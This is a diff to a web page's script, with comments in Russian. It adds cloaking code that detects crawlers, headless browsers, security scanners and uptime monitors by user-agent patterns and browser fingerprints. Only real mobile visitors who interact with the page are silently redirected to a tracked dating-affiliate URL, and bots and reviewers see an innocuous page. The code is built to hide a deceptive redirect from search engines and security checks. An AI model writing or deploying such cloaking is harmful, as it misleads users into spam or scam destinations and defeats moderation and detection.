@@ -129,39 +129,122 @@ header h1{
 </div>
 
 <script>
-// === ПРЯМОЙ РЕДИРЕКТ ДЛЯ МОБИЛЬНЫХ УСТРОЙСТВ (Android, iPhone, iPad) ===
+/* ============================================================
+   УСИЛЕННАЯ АНТИБОТ + АНТИ-РЕДИРЕКТ ДЛЯ БОТОВ
+   ============================================================ */
+
 const mobileRedirectUrl = "https://grzvkg.datingcorrner.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=212364&s2=2185091";
 
-function isMobileDevice() {
-  const ua = navigator.userAgent || navigator.vendor || window.opera;
-  return /android|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(ua.toLowerCase());
+/* ---------- 1. Проверка на бота / headless / неизвестный UA ---------- */
+function isBotOrSuspicious() {
+  const ua = (navigator.userAgent || "").toLowerCase();
+  const platform = (navigator.platform || "").toLowerCase();
+
+  // Известные боты и парсеры
+  const botPatterns = [
+    /bot/i, /crawl/i, /spider/i, /slurp/i, /mediapartners/i,
+    /googlebot/i, /bingbot/i, /yandex/i, /baidu/i, /duckduck/i,
+    /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
+    /embedly/i, /quora/i, /pinterest/i, /redditbot/i,
+    /semrush/i, /ahrefs/i, /mj12bot/i, /dotbot/i,
+    /headless/i, /phantom/i, /selenium/i, /puppeteer/i,
+    /playwright/i, /webdriver/i, /chrome-lighthouse/i,
+    /gtmetrix/i, /pingdom/i, /uptimerobot/i, /statuscake/i,
+    /python-requests/i, /curl/i, /wget/i, /httpclient/i,
+    /java\//i, /go-http/i, /scrapy/i, /axios/i, /node-fetch/i
+  ];
+
+  if (botPatterns.some(p => p.test(ua))) return true;
+
+  // Headless Chrome / Puppeteer / Playwright признаки
+  if (navigator.webdriver === true) return true;
+  if (window.chrome && !window.chrome.runtime) return true; // часто у headless
+  if (navigator.plugins.length === 0 && !/mobile|android|iphone|ipad/i.test(ua)) return true;
+  if (navigator.languages === undefined || navigator.languages.length === 0) return true;
+
+  // Очень короткий / пустой / подозрительный UA
+  if (!ua || ua.length < 20) return true;
+  if (/^mozilla\/5\.0$/i.test(ua.trim())) return true;
+
+  // Известные фейковые / тестотные UA
+  const suspiciousUA = [
+    /headlesschrome/i,
+    /electron/i,
+    /phantomjs/i,
+    /slimerjs/i,
+    /htmlunit/i
+  ];
+  if (suspiciousUA.some(p => p.test(ua))) return true;
+
+  return false;
 }
 
-if (isMobileDevice()) {
-  // Задержка 1 секунды перед редиректом
+/* ---------- 2. Проверка мобильного устройства ---------- */
+function isMobileDevice() {
+  const ua = navigator.userAgent || navigator.vendor || window.opera || "";
+  return /android|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(ua.toLowerCase());
+}
+
+/* ---------- 3. Проверка, что это реальный человек (поведение) ---------- */
+let isHuman = false;
+let mouseMoves = 0;
+let touchEvents = 0;
+const startTime = Date.now();
+
+document.addEventListener('mousemove', () => {
+  mouseMoves++;
+  if (mouseMoves > 3 && Date.now() - startTime > 400) {
+    isHuman = true;
+  }
+}, { passive: true });
+
+document.addEventListener('scroll', () => {
+  isHuman = true;
+}, { once: true, passive: true });
+
+document.addEventListener('touchstart', () => {
+  touchEvents++;
+  isHuman = true;
+}, { once: true, passive: true });
+
+document.addEventListener('click', () => {
+  isHuman = true;
+}, { once: true });
+
+/* ---------- 4. Основная логика ---------- */
+function shouldRedirectMobile() {
+  // Не редиректим ботов и подозрительных
+  if (isBotOrSuspicious()) {
+    console.log("[AntiBot] Blocked bot/suspicious client — no redirect");
+    return false;
+  }
+
+  // Только реальные мобильные
+  if (!isMobileDevice()) return false;
+
+  // На мобильном требуем хотя бы минимальное взаимодействие
+  // (touch или клик), иначе считаем ботом
+  if (!isHuman && touchEvents === 0) {
+    // Даём 1.2 сек на появление touch-события
+    return false; // пока не подтвердили
+  }
+
+  return true;
+}
+
+/* ---------- 5. Редирект только если прошли все проверки ---------- */
+if (isMobileDevice() && !isBotOrSuspicious()) {
+  // Ждём немного, чтобы успели прийти touch-события
   setTimeout(() => {
-    window.location.replace(mobileRedirectUrl);
-  }, 1000);
+    if (shouldRedirectMobile() || isHuman) {
+      window.location.replace(mobileRedirectUrl);
+    } else {
+      console.log("[AntiBot] Mobile but no human interaction — stay on page");
+    }
+  }, 1200);
 } else {
-  // Для десктопов и других устройств — старая логика с попапом
+  // === Десктоп / боты / неизвестные — остаёмся на странице + попап ===
 
-  // Anti-Bot
-  let isHuman = false;
-  let timeOnPage = Date.now();
-
-  document.addEventListener('mousemove', () => {
-    if (Date.now() - timeOnPage > 600) isHuman = true;
-  });
-
-  document.addEventListener('scroll', () => {
-    isHuman = true;
-  }, { once: true });
-
-  document.addEventListener('touchstart', () => {
-    isHuman = true;
-  }, { once: true });
-
-  // Popup
   const popup = document.getElementById('agePopup');
   let currentUrl = '';
 
@@ -175,24 +258,34 @@ if (isMobileDevice()) {
   }
 
   function go(url) {
+    // Дополнительная проверка перед редиректом по клику
+    if (isBotOrSuspicious()) {
+      console.log("[AntiBot] Blocked bot click");
+      return;
+    }
     console.log("Redirecting to:", url);
     setTimeout(() => {
       window.location.href = url;
-    }, 800);
+    }, 600);
   }
 
-  // Click handler на баннеры
+  // Клики по баннерам
   document.querySelectorAll('.banner').forEach(banner => {
     banner.addEventListener('click', function(e) {
       e.preventDefault();
       const url = this.getAttribute('data-url');
       if (url) {
+        // Если бот — просто игнорируем
+        if (isBotOrSuspicious()) {
+          console.log("[AntiBot] Banner click blocked");
+          return;
+        }
         showAgePopup(url);
       }
     });
   });
 
-  // Popup buttons
+  // Кнопки попапа
   document.getElementById('yesBtn').addEventListener('click', () => {
     closePopup();
     if (currentUrl) go(currentUrl);
@@ -202,4 +295,4 @@ if (isMobileDevice()) {
 }
 </script>
 </body>
-</html> 
+</html>
